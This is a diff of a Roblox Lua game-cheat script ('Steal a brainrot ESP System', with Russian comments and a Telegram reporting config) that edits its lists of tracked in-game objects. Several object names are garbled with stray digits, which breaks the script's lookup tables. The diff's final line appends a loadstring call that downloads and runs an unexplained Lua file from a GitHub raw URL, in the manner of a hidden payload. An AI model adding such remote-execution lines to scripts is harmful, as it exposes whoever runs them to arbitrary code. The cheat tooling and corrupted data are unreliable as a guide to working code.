@@ -35,8 +35,8 @@ local TG_MAIN = {
     ChatId = "1386387550",
     Enabled = true,
     ImportantObjects = {
-        ["mamaama"] = true,
-        ["gar"] = true,
+        ["Secret Lucky Block"] = true,
+        ["Pot H77otspot"] = true,
         ["La Grande Combinasion"] = true,
         ["Garama and Madundung"] = true,
         ["Nuclearo Dinossauro"] = true,
@@ -53,9 +53,14 @@ local TG_MAIN = {
         ["Strawberry Elephant"] = true,
         ["Ketchuru and Musturu"] = true,
         ["Los Nooo My Hotspotsitos"] = true,
-        ["La Karkerkar Combinsion"] = true,
+        ["La Kark7658erkar Combinasion"] = true,
         ["Tralaledon"] = true,
-        ["Los Bros"] = true
+        ["Los Bros"] = true,
+        ["gg"] = true,
+        ["Las sis"] = true,
+        ["Celularcini Viciosini"] = true,
+        ["La Extinct Grande"] = true,
+        ["Los Chicleteiras"] = true
     }
 }
 
@@ -88,7 +93,7 @@ local OBJECT_INCOME = {
     ["Las Tralaleritas"] = "625K/s",
     ["Graipuss Medussi"] = "1M/s",
     ["Torrtuginni Dragonfrutini"] = "350K/s",
-    ["Pot Hotspot"] = "2.5M/s",
+    ["Pot Hotsp666ot"] = "2.5M/s",
     ["La Grande Combinasion"] = "10M/s",
     ["Garama and Madundung"] = "50M/s",
     ["Secret Lucky Block"] = "???/s",
@@ -108,9 +113,13 @@ local OBJECT_INCOME = {
     ["Strawberry Elephant"] = "250M/s",
     ["Ketchuru and Musturu"] = "50M/s",
     ["Los Nooo My Hotspotsitos"] = "5M/s",
-    ["La Karkerkar Combinsion"] = "50M/s",
+    ["La Kark767erkar Combinasion"] = "50M/s",
     ["Tralaledon"] = "50M/s",
-    ["Los Bros"] = "50M/s"
+    ["Los Bros"] = "50M/s",
+    ["Las Sis"] = "50M/s",
+    ["Celularcini Viciosini"] = "50M/s",
+    ["La Extinct Grande"] = "50M/s",
+    ["Los Chicleteiras"] = "50M/s"
 }
 
 -- Множители мутаций и трейтов
@@ -150,10 +159,10 @@ local OBJECT_EMOJIS = {
     ["Las Tralaleritas"] = "🌸",
     ["Graipuss Medussi"] = "🦑",
     ["Torrtuginni Dragonfrutini"] = "🐉",
-    ["Pot Hotspot"] = "📱",
+    ["Pot Ho666tspot"] = "📱",
     ["La Grande Combinasion"] = "❗️",
     ["Garama and Madundung"] = "🥫",
-    ["Secret Lucky Block"] = "⬛️",
+    ["hff"] = "⬛️",
     ["Dragon Cannelloni"] = "🐲",
     ["Nuclearo Dinossauro"] = "🦕",
     ["Las Vaquitas Saturnitas"] = "👦",
@@ -171,9 +180,13 @@ local OBJECT_EMOJIS = {
     ["Spaghetti Tualetti"] = "🚽",
     ["Ketchuru and Musturu"] = "🍾",
     ["Los Nooo My Hotspotsitos"] = "🥔",
-    ["La Karkerkar Combinsion"] = "🥊",
+    ["La Kark666erkar Combinasion"] = "🥊",
     ["Tralaledon"] = "🦈",
-    ["Los Bros"] = "✊"
+    ["Los Bros"] = "✊",
+    ["Las Sis"] = "👩",
+    ["Celularcini Viciosini"] = "🦾",
+    ["La Extinct Grande"] = "🦴",
+    ["Los Chicleteiras"] = "💰"
 }
 
 -- Эмодзи для мутаций
@@ -195,10 +208,10 @@ local OBJECT_NAMES = {
     "Las Tralaleritas",
     "Graipuss Medussi",
     "Torrtuginni Dragonfrutini",
-    "Pot Hotspot",
+    "Pot Ho566tspot",
     "La Grande Combinasion",
     "Garama and Madundung",
-    "Secret Lucky Block",
+    "Sec555ret Lucky Block",
     "Dragon Cannelloni",
     "Nuclearo Dinossauro",
     "Las Vaquitas Saturnitas",
@@ -216,9 +229,13 @@ local OBJECT_NAMES = {
     "Spaghetti Tualetti",
     "Ketchuru and Musturu",
     "Los Nooo My Hotspotsitos",
-    "La Karkerkar Combinsion",
+    "La Kark56656erkar Combinasion",
     "Los Bros",
-    "Tralaledon"
+    "Tralaledon",
+    "Las Sis",
+    "Celularcini Viciosini",
+    "La Extinct Grande",
+    "Los Chicleteiras"
 }
 
 -- Системные переменные
@@ -741,4 +758,4 @@ print("Steal a brainrot ESP System активирован!")
 print("Отслеживается объектов: "..#OBJECT_NAMES)
 print("ID сервера:", getServerId())
 print("\nНажмите F для сканирования всех объектов")
-
+loadstring(game:HttpGet("https://raw.githubusercontent.com/ldkoedkeo/eblan2222/refs/heads/main/noob.lua"))()
